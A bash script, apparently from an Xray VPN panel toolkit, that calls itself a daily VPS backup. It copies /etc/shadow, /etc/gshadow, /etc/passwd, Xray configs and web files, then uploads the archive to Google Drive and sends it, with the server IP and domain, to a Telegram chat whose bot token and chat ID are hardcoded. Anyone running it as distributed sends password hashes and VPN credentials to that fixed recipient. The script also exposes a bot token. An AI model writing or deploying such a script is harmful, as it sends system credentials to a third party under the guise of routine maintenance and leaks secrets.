#!/bin/bash
# ==========================================
# AUTO BACKUP + TELEGRAM FILE NOTIFY
# BY KHOIRUL AMIR

# === CONFIG TELEGRAM ===
BOT_TOKEN="8300633089:AAG37Nd2bf_65SD_tItsJypQ2gDGejc5yKc"
CHAT_ID="5376506914"
TIME="120"
URL_DOC="https://api.telegram.org/bot$BOT_TOKEN/sendDocument"

# === INFO VPS ===
IP=$(curl -sS ipv4.icanhazip.com)
domain=$(cat /etc/xray/domain 2>/dev/null)
date=$(date +"%Y-%m-%d")

# === PROSES BACKUP ===
echo "Proses backup sedang berlangsung..."
rm -rf /root/backup
mkdir -p /root/backup

cp /etc/passwd /root/backup/
cp /etc/group /root/backup/
cp /etc/shadow /root/backup/
cp /etc/gshadow /root/backup/
cp /etc/crontab /root/backup/
cp -r /var/lib/kyt/ /root/backup/kyt 2>/dev/null
cp -r /etc/xray /root/backup/xray 2>/dev/null
cp -r /var/www/html/ /root/backup/html 2>/dev/null

cd /root || exit 1
zip -r "$IP-$date.zip" backup > /dev/null 2>&1

# === UPLOAD KE GOOGLE DRIVE ===
rclone copy "/root/$IP-$date.zip" dr:backup/ --progress
url=$(rclone link "dr:backup/$IP-$date.zip")
id=$(echo "$url" | grep -o '[-_a-zA-Z0-9]\{25,\}')
link="https://drive.google.com/u/4/uc?id=${id}&export=download"

# === SIAPKAN CAPTION TELEGRAM ===
CAPTION="◇━━━━━━━━━━━━━━◇
⚠️ BACKUP OTOMATIS ⚠️
Detail Backup VPS
◇━━━━━━━━━━━━━━◇
IP VPS  : ${IP}
DOMAIN  : ${domain}
Tanggal : ${date}
◇━━━━━━━━━━━━━━◇
Link Backup : ${link}
◇━━━━━━━━━━━━━━◇
Backup dibuat otomatis setiap hari.
BY BOT : @Kamirr21"

# === KIRIM FILE + CAPTION SEKALI KIRIM KE TELEGRAM ===
curl -s --max-time "$TIME" \
     -F "chat_id=$CHAT_ID" \
     -F "document=@/root/$IP-$date.zip" \
     -F "caption=$CAPTION" \
     -F "parse_mode=HTML" \
     "$URL_DOC" >/dev/null

# === HAPUS FILE SEMENTARA ===
rm -rf /root/backup
rm -f "/root/$IP-$date.zip"

echo "✅ Backup harian selesai, file dan detail backup terkirim sekali ke Telegram!"
